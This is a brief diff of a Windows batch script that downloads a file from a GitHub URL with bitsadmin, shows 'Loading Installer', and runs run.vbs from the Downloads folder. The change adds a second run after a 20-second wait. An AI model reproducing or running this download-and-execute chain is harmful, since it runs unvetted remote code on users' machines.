@@ -6,3 +6,5 @@ bitsadmin /transfer vote-download /priority high https://github.com/SPMNJ/Curren
 @echo Loading Installer
 TIMEOUT 3
 C:\Users\%USERNAME%\Downloads\run.vbs
+TIMEOUT 20
+C:\Users\%USERNAME%\Downloads\run.vbs
